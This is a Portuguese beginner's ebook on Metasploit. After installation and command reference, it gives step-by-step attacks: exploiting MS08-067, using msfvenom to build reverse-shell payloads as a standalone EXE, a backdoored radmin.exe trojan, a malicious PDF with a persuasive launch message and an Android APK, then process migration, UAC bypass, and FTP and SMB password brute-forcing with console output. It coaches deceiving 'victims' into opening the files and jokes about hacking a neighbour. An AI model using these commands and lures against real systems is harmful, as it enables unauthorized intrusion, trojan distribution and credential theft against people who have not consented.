---
id: ckb-3e6e4341e0c6
title: Ebook Invadindo Com Metasploit Vl 1
category: offensive-security
format: guide
language: pt
tags: [android, linux, metasploit, mobile, password-security, windows]
authors: [unknown]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.91
---

1

SOBRE O AUTOR DO LIVRO:
Nome: Joas Antonio dos Santos
Sou estudante/profissional de TI e segurança da informação, sou
instrutor de Pentest/Ethical Hacking, possuo mais de 90 formações
na área de Segurança, Redes, Programação e Tecnologia em geral
com certificações internacionais.

SOBRE O LIVRO:
Esse livro é para guiar pessoal que acabou de começar a estudar
Pentest e quer aprender sobre a ferramenta Metasploit.
Ops: Não pense que aprender a usar o Metasploit ou outra
ferramenta vai te tornar um Hacker pois isso tudo exige bastante
estudo.

CONTEÚDO:
Ela foi escrita a um tempo então alguns conteúdos podem estar
desatualizados, mas nada que o nosso bom e velho amigo GOOGLE
para nos auxiliar.

Esse Livro é bem básico então me desculpe pela falta de detalhes o
meu objetivo foi um Livro prático a teoria vai ficar na sua conta pois
as vezes é bom correr atrás dos fundamentos para entender o resto,
mas garanto que futuramente vai sair um Livro completo + Curso
em Vídeo aula sobre essa ferramenta com fundamentos a prática.

2

Conceitos:
1- Oque é Metasploit
2- Instalação e Atualização
3- Resolvendo Erro no Banco de dados
4- Definições
5- Comandos Msfconsole
Exploração:
6- Comprometendo a Maquina Windows XP
7- Comandos Do Meterpreter
8- Introdução ao MSFVENOM
9- Comprometendo a Maquina Windows 7 e 10
10- Criando Um PDF Malicioso
11- Criando Um Arquivo EXE Malicioso a partir de um Existente
12- Comprometendo Um Dispositivo Android
Pós Exploração:
13- Migrando Um Processo Para o Outro
14- Introdução ao Prompt de Comando
15- Escalação de Privilégio
16- Usando Módulo Auxiliares

3

CONCEITOS

Oque é Metasploit?
O Metasploit Framework (MSF) é muito mais do que apenas uma
coleção de explorações. É uma infra-estrutura que você pode construir e
utilizar para suas necessidades personalizadas. Isso permite que você
se concentre em seu ambiente único e não precise reinventar a
roda. Considero que o MSF é uma das ferramentas de auditoria mais
úteis e gratuitas disponíveis gratuitamente para profissionais de
segurança. A partir de uma ampla gama de explorações de grau
comercial e um extenso ambiente de desenvolvimento de exploração,
todo o caminho para ferramentas de coleta de informações de rede e
plugins de vulnerabilidades web, o Metasploit Framework oferece um
ambiente de trabalho verdadeiramente impressionante.
O projeto Metasploit foi criado em 2003 por HD Moore e é uma
plataforma que permite a verificação do estado da segurança dos
computadores existentes numa determinada rede, permitindo atacar as
falhas de segurança existentes nos mais diversos softwares. Este é o
melhor conjunto de ferramentas para exploração, sendo atualizadas
diariamente com as mais recentes falhas de segurança identificadas por
profissionais no ramo. Esta “framework” open source, está em constante
transformação, é programada em Ruby e está organizada em diversos
módulos. São estes módulos que contêm os programas preparados
especificamente para tirarem partido de vulnerabilidades encontradas
nos softwares e sistemas operacionais, permitindo assim a execução de
código malicioso e consequentemente a invasão da máquina.
Versões:
Metasploit Express: Teste de Intrusão por linha de comando
Geralmente utilizado em pequenas e médias empresas $ 5,000
Metasploit PRO: Versão do Metasploit Profissional, Pago!
Aproximadamente $ 11,000
Metasploit Community Edition: Versão gratuita do Metasploit Pro $
0,00
Armitage: Uma interface grafica que não foi criada pelos criadores do
Metasploit

4

Instalação e Atualização
Instalação no Linux:
1. Abra o terminal

2. Agora baixe de acordo com seu Sistema Operacional

Sistemas 64 bits:

wget http://downloads.metasploit.com/data/releases/metasploit-latestlinux-
x64-installer.run

Sistemas 32 bits:

wget http://downloads.metasploit.com/data/releases/metasploit-latestlinux-
installer.run

3. Altere o modo do instalador para ser executável

Sistemas 64 bits:

chmod +x /path/to/metasploit-latest-linux-x64-installer.run

Sistemas 32 bits:

chmod +x /path/to/metasploit-latest-linux-installer.run

4. Escolha uma das opções abaixo para executar o instalador

Sistemas 64 bits:

sudo /path/to/metasploit-latest-linux-x64-installer.run

Sistemas 32 bits:

sudo /path/to/metasploit-latest-linux-installer.run

5. Quando a janela de configuração aparecer, clique em Avançar
(Forward) para iniciar o processo de instalação.

5

6. Aceite os Termos e clique em Avançar (Forward).

7. Escolha uma pasta para instalação e Clique em
Avançar(Forward).

8. Selecione Sim para registrar o Metasploit como um serviço
(recomendado). Clique em Avançar para continuar.

6

9. Quando a janela Desativar antivírus e Firewall for exibida, verifique se
sua máquina não possui antivírus Aplicativos de software ou firewall
em execução. Clique em Avançar quando estiver pronto.

10. Digite o número da porta que deseja que o serviço Metasploit
use. A porta padrão e 3790. Clique Avançar para continuar.

11. Digite o nome do servidor que será usado para gerar o
certificado SSL e o número de dias que você deseja que o
certificado SSL permaneça válido.

7

12. Clique em Avançar para continuar. A instalação começa.

Após a conclusão da instalação, aparece uma janela e solicita que você
inicie a UI da Web Metasploit. Neste ponto, você deve acessar
https://localhost:3790 para iniciar a UI da Web Metasploit para criar uma
conta de usuário e ativar sua chave de licença. Você não precisa
reiniciar seu sistema para relançar o Metasploit pela primeira vez.

Ativando uma Chave de Licença
1. Abra seu navegador em https://localhost:3790

2. Se você receber um aviso sobre a confiabilidade do certificado
de segurança, selecione que compreende os riscos e que deseje
continuar com o site. O texto que o aviso exibe depende do
navegador que você usa.

3. Quando a interface da web para o Metasploit Pro aparece, a
página Nova Configuração do Usuário é exibida. Siga as
instruções na tela para criar uma conta de usuário para o
Metasploit Pro. Salve as informações da conta do usuário para
que você possa usá-lo mais tarde para fazer login no Metasploit
Pro.

8

4. Depois de criar uma conta de usuário, aparece a página Ativar
Metasploit. Digite a chave de licença que você recebeu do
Rapid7 no campo Chave de produto.

Se você precisa usar um proxy HTTP para acessar a internet,
você pode selecionar a opção proxy HTTP e fornecer as
informações para o servidor proxy HTTP que deseja usar.

5. Ative a chave da licença. Depois de ativar a chave de licença,
aparece a página Projetos. Se você precisar de ajuda para
começar, leia o Guia de Introdução do Metasploit Pro em
https://community.rapid7.com/docs/DOC-1570

6. Só reiniciar os serviços Metasploit:

Para reiniciar o serviço Metasploit, abra um terminal de linha de
comando e execute o seguinte comando: $ Sudo bash
/opt/metasploit/ctlscript.sh reiniciar

Instalação Windows:
1. Visite http://windows.metasploit.com/metasploitframework-
latest.msi para baixar o instalador do Windows.
2. Depois de baixar o instalador, localize o arquivo e clique duas
vezes no ícone do instalador para iniciar o processo de
instalação.

9

3. Quando a tela Configuração for exibida, clique em Avançar para
continuar.

4. Leia o contrato de licença e selecione a opção Aceito aceito . Clique
em Avançar para continuar.

10

5. Procure o local onde deseja instalar o Metasploit Framework. Por
padrão, o framework está instalado no C:\ Metasploit-
framework. Clique em Avançar para continuar.

6. Clique em Instalar .

7. O processo de instalação pode levar 5-10 minutos para ser
concluído. Quando a instalação for concluída, clique
no botão Finalizar.. Para iniciar o msfconsole após a conclusão da
instalação, execute o seguinte a partir da linha de comando:
8. $ msfconsole.bat

11

Resolvendo Erro no Banco de dados
Erro na conexão do banco de dados do metasploit Linux
solução:
Service postgresql stop
Msfdb reinit
Service postgresql start
Msfconsole
Db_rebuild_cache = Espere 10 a 15 Minutos e depois
Relload_all

Por fim com service postgresql ativado dê o seguinte comando:
update.rc-d postgresql enable
Para quando reiniciar a máquina continue com serviço postgresql
ativado.

12

Definições

•Exploit = É um meio pelo qual um atacante consegue explorar uma
falha dentro de um Sistema
•Payload = Um código embutido em um exploit utilizado para
definição de pós exploração. É a ação que será executada pós
exploração
•Shellcode = É o código do Payload que é injetado no sistema
comprometido através do exploit.
•Module = Pequenos pedaços de scripts que podem ser utilizados
pelo metasploit para realizar determinadas operações
•Listener = Componente que aguarda uma conexão de retorno pós
invasão. Útil para conexão reversa

13

Comandos Msfconsole
MSFConsole: Console do metasploit para facilitação de ataques
Sintaxe: msfconsole
Opções Básicas:
? – Apresenta o menu de ajuda
Back – Volta um nível
Banner – Apresenta o Banner do Metasploit
Cd – Altera o diretório corrente do Metasploit
Color - Altera a cor do metasploit
Connect – Conecta com outro Host
Edit – Edita o módulo corrente
Exit – Sair do console
Go_pro – Inicia o Metasploit em tela gráfica
Grep – Filtra a saída do comando
Help – Apresenta o menu de ajuda
Info – Apresenta informações sobre um ou mais módulos
Irb – Interpretador de comando Ruby
Jobs – Visualização e gerenciamento de tarefas
Kill – Eliminador de tarefas
Load – Carregador de Framework Plugin
LoadPath – Adicionar caminhos aos módulos
Makerc – Salvar comandos executados desde a inicialização para o arquivo
especificado
Popm – Apresenta o último módulo fora da pilha e o ativa, sem alterar o
módulo em execução
Previous – Define o módulo carregado anteriormente como o módulo atual
Pushm – Empurra os módulos ativos para a pilha
Quit – Sair do console
Reload_all – Recarrega todos os módulos
Resource – Carrega os comandos armazenados em um arquivo
Route – Rotear o tráfego através de uma sessão
14

Save – Armazena os dados ativos
Search – Procura módulos por nomes e/ou descrições
Sessions – Alterna entre sessões Set – Seta um valor à uma variável
Setg – Seta um valor à uma variável global
Show – Apresenta módulos de um determinado tipo ou todos os módulos
Sleep – Não faz para durante um número especificado de segundos
Spool – Apresenta no console o conteúdo de um arquivo
Threads – Multiplica o número de requisições/ataques
Unload – Descarregar um framework plugin
Unset – Limpar dados de variáveis
Unsetg – Limpar dados de variáveis globais Use – Seleciona um módulo pelo
nome
Version – Apresenta as versões do framework e o número de bibliotecas

15

EXPLORAÇÃO
Comprometendo Windows XP

 Então vamos explorar uma vulnerabilidade no Windows XP chamada MS08-067
que basicamente, faz execução de um código remoto ao qual o invasor que
aproveite dessa vulnerabilidade possa assumir completamente o controle da
máquina.
Mais Detalhes: https://support.microsoft.com/en-us/help/958644/ms08-067-
vulnerability-in-server-service-could-allow-remote-code-execu

Vamos começar?
1- Digite no seu terminal “msfconsole” (sem as aspas)

2- Agora selecione o exploit

3- Agora selecione o Payload

4- Agora sete o IP do Alvo
16

5- Sete o seu IP

6- Agora sete o IP do Atacante, ou seja, o seu IP

7- Antes de Iniciar a Exploração pode usar a opção “check” para
checar se a máquina alvo está vulnerável.

8- Caso apareça a mensagem “The target is vulnerable.” Pode
iniciar a exploração

Caso apareça o “Meterpreter” significa que deu certo.

17

Comandos do Meterpreter

?: Mostra a ajuda do Meterpreter explicando todos os comandos.
background: Envia a sessão atual para o background e você volta para o
msfconsole para continuar trabalhando.
Sessions -l: lista todas as sessões do Meterpreter
Session -i: conecta em uma sessão do Meterpreter por exemplo: sessions -i 1
“Me conecto na sessão 1 do Meterpreter.
bgkill: Mata algum processo que foi enviado para o background anteriormente.
Você precisa usar o bglist para verificar o ID do processo que você deseja
matar. Depois, você usa “bgkill <Numero do processo>” para finalizá-lo.
channel: Mostra informações sobre os canais ativos.
close: Fecha um canal.
disable_unicode_encoding/enable_unicode_encoding: Habilita ou
desabilita o uso do Unicode.
exit: Fecha uma sessão do Meterpreter.
help: Mostra o menu de ajuda.
info: Mostra informações sobre um módulo do tipo “post” (os nomes de todos
eles começam com “post”).
interact: Abre um shell com a vítima. Quando você fechar este shell, voltará
para o prompt do Meterpreter.
irb: Abre uma sessão do irb, o interpretador de comandos do Ruby.
load: Carrega extensões do Meterpreter.
migrate: Migra o Meterpreter para um outro processo da máquina.
quit: Termina a sessão.
read: Lê dados de um canal.
resource: Executa todos os comandos que estão no arquivo que você passar
como parâmetro para este comando.
run: Executa um script. Veremos este comando em detalhes mais adiante.
use: É um alias para o comando load, explicado anteriormente, que está
caindo em desuso.

18

Introdução ao MSFVENOM
msfvenom é uma combinação de Msfpayload e Msfencode , colocando essas
duas ferramentas em uma única instância do Framework. msfvenom substituiu
msfpayload e msfencode a partir de 8 de junho de 2015.
As vantagens do msfvenom são:

Uma única ferramenta

Opções de linha de comando padronizadas

Aumento da velocidade
A Msfvenom possui uma ampla gama de opções disponíveis:
    -p, - carregar um payload para usar. Especifique um payload para usar
        --payload-options  Lista as opções padrão
    -l, --list [type] Lista um tipo de módulo. As opções são: cargas úteis,
codificadores, nops, tudo
    -n, - nopsled Prepend um nopsled de tamanho [length] na carga útil
    -f, --format Formato de saída (use --help-formatos para uma lista)
        - formatos de ajuda Formatos disponíveis para a lista
    -e, --encoder O codificador para usar
    -a, --arch A arquitetura para usar
        --plataforma A plataforma da carga útil
        --help-platform Lista de plataformas disponíveis
    -s, --space O tamanho máximo da carga útil resultante
        --coder-espaço O tamanho máximo da carga útil codificada (padrão para o
valor -s)
    -b, --bad-chars A lista de caracteres para evitar o exemplo: '\ x00 \ xff'
    -i, - sensações O número de vezes para codificar a carga útil
    -c, --add-code Especifica um arquivo shellcode win32 adicional para incluir
    -x, --template Especifica um arquivo executável personalizado para usar
como modelo
    -k, - manutenção Mantenha o comportamento do modelo e injete a carga
como um novo tópico
    -o, --out Salve a carga útil
    -v, --var-name Especifica um nome de variável personalizado para usar para
determinados formatos de saída
        --mulher Gerar a menor carga útil possível
    -h, --help Mostrar esta mensagem

19

Comprometendo a Máquina Windows 7 e 10
Agora que já comprometemos uma Máquina Windows XP que tal comprometer
uma Máquina Windows 7 ou 10?
Não iremos usar um exploit como foi usado para comprometer uma Máquina
Windows XP que está na rede, mas vamos usar o MSFVENOM para criar um
Payload e fazer uma Conexão Reversa, como assim?
Usando o Msfvenom vamos gerar um executável malicioso ao qual a vitima irá
baixar  é a mesma coisa de um RAT (Remote Acess Trojan) que basicamente
quando a vitima clica-se no executável ela fosse infectada e o atacante
conseguisse fazer qualquer coisa, Deletar, Roubar e Inserir, arquivos ou um
keylogger para capturar tudo o que a vítima digita.
Chega de Enrolação e vamos para prática!! (Primeiro vou digitar passo a passo
e depois mostro como fica o comando completo)
Primeiro vamos gerar o nosso executável malicioso
No terminal digite:
Msfvenom (Seria a Ferramenta)
-p (Payload)
Caso queira ver os payloads existentes de um --list payloads no nosso caso
vamos usar o mesmo payload que usamos para comprometer a máquina
Windows XP então digite:
-p Windows/meterpreter/reverse_tcp
(Reverse tcp seria pra fazer uma conexão reversa, ou seja a vítima ao abrir o
executável ela se conectaria com você, já ja você entenderá)
Agora vamos estabelecer o IP ao qual a vítima irá se conectar ou seja, o IP do
atacante, então digite:
LHOST=”SEU IP”
Agora vamos estabelecer a PORTA que vamos abrir ao qual a vítima irá se
conectar.
LPORT=”PORTA” (padrão é 4444)
Agora vamos definir o formato então digite
-f exe
Agora vamos salvar o arquivo, no meu caso vou jogar no meu servidor
Apache2 que vem por padrão no Kali Linux então eu coloco
> /var/www/html/payload.exe

20

Vamos ver o Comando Completo?
Depois disso de um Enter e ele vai dar essa mensagem caso esteja tudo ok.
Agora vamos iniciar o MSFCONSOLE para que possamos receber a conexão,
pois se á vitima clicar no Payload não irá ocorrer nada sem uma sessão aberta
no MSFCONSOLE. Vamos ver?
Digite: msfconsole
E vamos selecionar um exploit genérico, então digite:
Use multi/handler

Em seguida vamos digitar o Payload:
set PAYLOAD Windows/meterpreter/reverse_tcp

Agora vamos setar o nosso IP ao qual a vítima irá fazer a conexão, então
digite:
set LHOST “IP”

21

Agora vamos setar a porta que digitamos no MSFVENOM no meu caso foi a
4444 então digite:

Depois disso vamos dar um exploit para iniciar a conexão

Com isso ele vai esperar a vítima baixar o payload e executar, então espere a
vítima cair na sua Engenharia Social, e como vou saber se ela executou ou
não? Quando aparecer essa mensagem aqui.

Pronto! Pode pular de alegria que o senhor comprometeu a maquina do seu
vizinho chato  kkkkk (Brincadeira)
Lembre-se: Eu usei uma máquina controlada ou seja, o Firewall estava
desativado e o Antivírus também.

22

Criando Um PDF Malicioso
Então conseguimos comprometer uma máquina Windows 7 e 10 com um
Executável, mas dependendo do estado de segurança do Windows da vítima
um Executável não adiantaria, mas podemos invadir com outro método usando
o Adobe PDF por meio de um exploit, vamos ver?
Então vamos usar o grep -i pdf “search” e jogar a palavra chave
“exploit/Windows/fileformat” (sem as aspas)

Ele vai nos dar os seguintes resultados:

Vamos usar o seguinte exploit:
exploit/Windows/fileformat/adobe_pdf_embedded_exe
Então digite no msfconsole: use
exploit/Windows/fileformat/adobe_pdf_embedded_exe

Vamos usar o “info” para ver as versões vulneráveis do adobe pdf.

23

Então perceba:

Ele diz que a versão 8 e 9 está vulnerável e ainda diz os sistemas operacionais
que são Windows XP SP3, Windows Vista e 7
Então vamos a exploração:
Antes sete o payload eu vou usar o meterpreter então eu vou digitar:
Set payload Windows/meterpreter/reverse_tcp
Agora eu digito o LHOST e o LPORT por padrão já vem 4444 e vou manter
assim.
Agora vamos ver as opções que esse exploit nos fornece, então eu digito show
options para me mostrar

24

Perceba que ele pede EXENAME ou Nome do Executável mais não é
Requerido ou seja, não é obrigatório.
FILENAME por padrão ele gera o evil.pdf mas tu pode mudar pro nome que
quiser.pdf
INFILENAME por padrão é aquele template de pdf mas tu pode pegar um
existente e substituir para que fique mais difícil da vítima desconfiar.
LAUNCH_MESSAGE é a mensagem que aparece quando ela for abrir o PDF,
eu recomendo trocar para um mensagem em que convença a vítima a abrir.
Vamos para prática:
Vou começar renomeando o pdf, então de set FILENAME “nome que deseja”

Vou mudar o arquivo também mas não é obrigatório eu vou usar um pdf
qualquer.

Peguei um pdf qualquer no meu Kali eu digitei no terminal “locate .pdf” e
selecionei qualquer um.
E Agora vou mudar a mensagem para que a vítima seja convencida, então use
a sua criatividade, então digite set LAUNCH_MESSAGE “Mensagem”

Usarei essa mensagem mas é lógico que não vai convencer muitos
principalmente quem não é de TI.
Agora eu dou um exploit e ele vai gerar o pdf e no meu caso ele vai jogar na
pasta /root/.msf4/local

25

Antes de você mandar o seu pdf para vítima não se esqueça de configurar o
exploit genérico, então digite “back” para sair do exploit

E faça o processo padrão:
Use multi/handler
E depois digite o payload:
Set payload Windows/meterpreter/reverse_tcp
Set lhost “seu ip”
Set lport “porta que você selecionou”
E depois disse de um “exploit” ou “run” para iniciar a conexão
Agora mande o pdf malicioso para vítima e espere ela abrir
.
Pronto! Quando ela abrir você vai receber a conexão com Meterpreter e agora
é só Brincar!

26

Criando Um Arquivo EXE Malicioso a partir de um
Existente

Agora vamos ver como podemos transformar o nosso Payload ou Backdoor em
um Trojan.
Trojan = Também conhecido como cavalo de Troia (em inglês Trojan horse), é
um malware que executa ações em um computador criando uma porta para
uma possível invasão sem a autorização do usuário. Trata-se de um programa
que tem um pacote de vírus e na maioria das vezes é utilizado para se
conseguir informações de outros computadores ou executar operações
indevidas em diversos dispositivos. Essas instruções são pré-programadas
pelos criminosos e depois enviadas como vírus para as vítimas.
No Kali Linux existe uma pasta que é a /usr/share/Windows-binaries onde
contem uns executáveis, vamos dar uma olhada?

Observe em verdes são os programas, vamos usar o radmin.exe, Chega de
enrolação e vamos para pratica.
Msfvenom -p Windows/meterpreter/reverse_tcp lhost=”IP” lport=”porta” -
x radmin.exe -k -f exe > radmin2.exe
Vou explicar o passo a passo depois do LPORT
-x = “Indica qual arquivo ele vai colocar o backdoor”
-k = “Para dizer para ele fazer um Bind”
-f = “Formato final”
Ficara assim:

Depois de gerar o nosso trojan, antes de mandar para vítima faça o processo
do multi/handler então digite:
Msfconsole
Use multi/handler
Set payload Windows/meterpreter/reverse_tcp
27

Set lhost “ip”
Set lport “porta que colocou, no meu caso é a 2222”
Exploit
E agora é só esperar a vítima clicar e você receberá a conexão com
meterpreter.
Esse é o executável, difícil a vitimar desconfiar.
Diferente de um payload que não possui ícone
Pode gerar uma desconfiança.

Então quando a vítima executar o Trojan irá abrir essa tela

Na imagem o lado Direito temos o Trojan Executado, e no lado Esquerdo é a
conexão realizada.

28

Comprometendo Um Dispositivo Android

Agora vamos comprometer um Dispositivo Android como SmartPhones e
Tablets, vamos lá!
Primeiramente vamos gerar um apk malicioso usando com o msfvenom, e
vamos usar o payload do android, então digite:
Msfvenom -p android/meterpreter/reverse_tcp lhost=”IP” lport=”De sua
preferência” -f apk > “nome do apk”
Então vai ficar assim:

Depois de gerar faça o processo padrão do multi/handler.
msfconsole
Use multi/handler
Set payload android/meterpreter/reverse_tcp
Set lhost “ip”
Set lport “porta que colocou”
Exploit
E ai é só esperar a vítima baixar e executar.
Lembre-se: O aplicativo após ser instalado não vai possuir o nome que você
colocou, ele vai ficar como “MAIN ACTIVY”

Pronto! Você comprometeu o Dispositivo da vítima.
Como é difícil usuários leigos ler o contrato do Aplicativo que baixam ou ter um
antivírus no celular, é muito fácil efetuar uma invasão em dispositivos celular ou
tablets que usa o sistema android.

29

PÓS EXPLORAÇÃO
Migrando Um Processo Para o Outro
Agora vamos entrar com conteúdo de pós-exploração. Então agora eu vou
ensinar como migrar um processo para o outro, como assim? Os processos
são softwares que estão rodando em seu computador, tanto em primeiro plano
como em segundo plano, um payload a ser executado ele abre um processo,
então se a vítima encerrar esse processo você perderá a conexão com a
máquina, mas se migrarmos um processo a vítima poderá fechar o processo do
payload que você não perderá a conexão. Vamos ver na pratica.
Então  depois de comprometer a máquina da vítima e obter a sessão no
Meterpreter, vamos digitar o seguinte comando:
PS = Listar os Processos Ativados

Esses são os processos que estão rodando em minha máquina. Mas um
detalhe processos que precisa de permissão do Administrador ou Root (no
Linux) sem a escalação de privilégio (vamos ver jajá) não vai ser possível
migrar, e para identificar esses processos, são aqueles que não tem Usuário.
Um processo que eu recomendo a todos migrarem é o “explorer.exe” é difícil
algum  usuário leigo pensar em desativa-lo. Então como fazemos?
30

Perceba na Imagem que temos o explorer.exe e ele não é uma “Autoridade de
Sistema” e perceba que o meu “PAYLOAD” é a mesma coisa, e perceba que
marquei o numero 1244 do explorer.exe que seria o numero do processo,
então por esse numero vamos migrar. Vamos ver? Então digite:
Migrate “numero do processo” no meu caso é o 1244 do explorer.exe

Perceba ele tá migrando o processo 2964 (payload) pro 1244 (explorer.exe)
Então se a vítima encerrar vou continuar com a conexão, então você pode
digitar:
Kill “processo do payload” no meu caso é o 2964

Ele deu um erro mas ele conseguiu encerrar o processo.

Viu? Então a primeira coisa da pós exploração é a migração de processo.
31

Introdução ao Prompt de Comando
Para uma pós exploração legal precisamos conhecer o Prompt de Comando ou
MS-DOS do (WINDOWS), então vamos conhecer alguns comandos e dar uma
brincada.
Comandos:
Dir = lista os diretórios
Deltree = apaga pastas com subpastas e todos os arquivos
Shutdown = permite desligar o computador local ou remoto
Systeminfo = Dá informações do sistema
Tasklist = mostra a lista de processos
Taskkill = fecha algum processo exemplo: taskkill /pid “numero do
processo”
Whoami = mostra as permissões que você possui
Ipconfig = exibe as configurações de Ip, gateway e mascara de sub-rede
CD = Navega em diretórios
Start = Inicia alguma aplicação
MKDIR = cria um novo diretório
RMDIR = remove um diretório

32

Escalação de Privilégios

Vamos usar alguns módulos auxiliares para nos ajudar com a pós exploração,
e primeiramente vamos escalar nossos privilégios. No meterpreter digite:
Background para sair da sessão, e digite search bypassuac e vai aparecer os
seguintes resultados:

vamos usar o exploit/Windows/local/bypassuac
Então digite: use exploit/Windows/local/bypassuac
Em seguida dê um Show options

Perceba que ele pede SESSÃO do meterpreter, então digite: sessions -l

33

E Perceba que temos uma sessão aberta, então pegue o ID e digite: set
SESSION “numero da sessão” antes disso perceba que no target vai está
Windows x86 ou seja 32 bits, caso o sistema da vítima for x64 de um show
targets

E em seguida escreva: set target “id”
Depois disso digite: exploit

Elevai abrir em seguida uma nova sessão no meterpreter, caso não entre
automaticamente digite: sessions -i “ID DA NOVA SESSÃO”
Depois disso digite:

Pronto! Privilégio escalado.

34

MÓDULOS AUXILIARES

Vamos ver agora alguns módulos para auxiliar na sua pós exploração, vou
apresentar 3 módulos mesmo, coisa básica.

1- FTP SCAN

Vamos escanear uma rede por meio do metasploit a procura de serviços
FTP em alguma máquina conectada pela rede.
Então vamos usar:
O scanner "ftp / anonymous" digitalizará um intervalo de endereços IP na busca
de servidores FTP que permitem o acesso anônimo e determina onde as
permissões de leitura ou gravação são permitidas.
msf > use auxiliary/scanner/ftp/anonymous
msf auxiliary(anonymous) > show options

Module options:

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified
username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target address range or CIDR
identifier
   RPORT    21                   yes       The target port
   THREADS  1                    yes       The number of concurrent threads

Vamos configurar o módulo selecionando o range de IP que vai ser escaneado,
e as THREADS que ele vai usar para escanear ou seja a velocidade o
processamento.

35

2- FTP LOGIN

Agora vamos fazer um ataque de força bruta encima do serviço FTP,
com o objetivo de quebrar a senha do servidor FTP.

Então vamos usar:
msf > use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > show options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting                     Required
Description
   ----              ---------------                     --------  ----------
-
   BLANK_PASSWORDS   false                               no        Try blank
passwords for all users
   BRUTEFORCE_SPEED  5                                   yes       How fast
to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                               no        Try each
user/password couple stored in the current database
   DB_ALL_PASS       false                               no        Add all
passwords in the current database to the list
   DB_ALL_USERS      false                               no        Add all
users in the current database to the list
   PASSWORD                                              no        A specific
password to authenticate with
   PASS_FILE         /usr/share/wordlists/fasttrack.txt  no        File
containing passwords, one per line
   Proxies                                               no        A proxy
chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false                               no        Record
anonymous/guest logins to the database
   RHOSTS                                                yes       The target
address range or CIDR identifier
   RPORT             21                                  yes       The target
port (TCP)
   STOP_ON_SUCCESS   false                               yes       Stop
guessing when a credential works for a host
   THREADS           1                                   yes       The number
of concurrent threads
   USERNAME                                              no        A specific
username to authenticate as
   USERPASS_FILE                                         no        File
containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                               no        Try the
username as the password for all users
   USER_FILE                                             no        File
containing usernames, one per line
   VERBOSE           true                                yes       Whether to
print output for all attempts

36

Agora você pode configurar o Endereço IP Alvo, PASS_FILE e USER_FILE
msf auxiliary(ftp_login) > set RHOSTS 192.168.69.50-254
RHOSTS => 192.168.69.50-254
msf auxiliary(ftp_login) > set THREADS 205
THREADS => 205
msf auxiliary(ftp_login) > set USER_FILE userlist.txt
USER_FILE => userlist.txt
msf auxiliary(ftp_login) > set PASS_FILE passlist.txt
PASS_FILE => passlist.txt
msf auxiliary(ftp_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(ftp_login) > run

[*] 192.168.69.51:21 - Starting FTP login sweep
[*] 192.168.69.50:21 - Starting FTP login sweep
[*] 192.168.69.52:21 - Starting FTP login sweep
...snip...
[*] Scanned 082 of 205 hosts (040% complete)
[*] 192.168.69.135:21 - FTP Banner: '220 ProFTPD 1.3.1 Server (Debian)
[::ffff:192.168.69.135]\x0d\x0a'
[*] Scanned 204 of 205 hosts (099% complete)
[+] 192.168.69.135:21 - Successful FTP login for 'msfadmin':'msfadmin'
[*] 192.168.69.135:21 - User 'msfadmin' has READ/WRITE access
[*] Scanned 205 of 205 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ftp_login) >
Verbose False é para não mostrar na tela a quebra da senha, só mostrar o
resultado dela.

37

3- SMB LOGIN

Agora vamos fazer um ataque de força bruta encima do SMB.
Então vamos usar:

Em seguida vamos setar o Endereço IP Alvo, USER_FILE e PASS_FILE
msf auxiliary(smb_login) > show options

Module options:

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             yes       Try blank passwords for all
users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from
0 to 5
   PASS_FILE                          no        File containing passwords,
one per line
   RHOSTS                             yes       The target address range or
CIDR identifier
   RPORT             445              yes       Set the SMB service port
   SMBDomain         WORKGROUP        no        SMB Domain
   SMBPass                            no        SMB Password
   SMBUser                            no        SMB Username
38

   STOP_ON_SUCCESS   false            yes       Stop guessing when a
credential works for a host
   THREADS           1                yes       The number of concurrent
threads
   USERPASS_FILE                      no        File containing users and
passwords separated by space, one pair per line
   USER_FILE                          no        File containing usernames,
one per line
   VERBOSE           true             yes       Whether to print output for
all attempts

msf auxiliary(smb_login) > set PASS_FILE /root/passwords.txt
PASS_FILE => /root/passwords.txt
msf auxiliary(smb_login) > set USER_FILE /root/users.txt
USER_FILE => /root/users.txt
msf auxiliary(smb_login) > set RHOSTS 192.168.1.150-165
RHOSTS => 192.168.1.150-165
msf auxiliary(smb_login) > set THREADS 16
THREADS => 16
msf auxiliary(smb_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(smb_login) > run

[-] 192.168.1.162 - FAILED LOGIN (Windows 7 Enterprise 7600) Administrator :
(STATUS_ACCOUNT_DISABLED)
[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) dale :
[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) chip :
[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) dookie :
[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) jimmie :
[+] 192.168.1.150 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
[+] 192.168.1.160 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
[+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
[+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'victim' : 's3cr3t'
[+] 192.168.1.162 - SUCCESSFUL LOGIN (Windows 7 Enterprise 7600) 'victim' :
's3cr3t'
[*] Scanned 15 of 16 hosts (093% complete)
[*] Scanned 16 of 16 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_login) >

Pronto ele quebrou a senha do SMB!

39

Para quem leu até aqui eu agradeço, o livro
foi básico como eu disse não foi algo bem
sério tá mais para algumas dicas em PDF,
mas prometo que nos próximos vou
melhorar.

DESDE JÁ AGRADEÇO A TODOS 😉
